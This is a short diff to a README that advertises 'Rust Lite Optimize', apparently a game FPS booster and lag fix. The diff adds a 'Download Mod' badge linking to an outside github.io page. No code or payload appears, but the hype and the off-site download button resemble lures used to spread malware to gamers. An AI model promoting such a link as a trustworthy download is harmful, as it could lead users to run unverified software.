@@ -8,6 +8,8 @@ Rust Lite Optimize – FPS Booster & Lag Fix for Smooth Survival
 
 Rust Lite Optimize is built for low-end warriors and high-FPS addicts. Lag? Gone. Frame drops? History.
 
+
+[![Download Rust Lite Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://rust-lite-optimize-mod.github.io/.github/)
 ---
 
 ## 🛠️ Product Description:
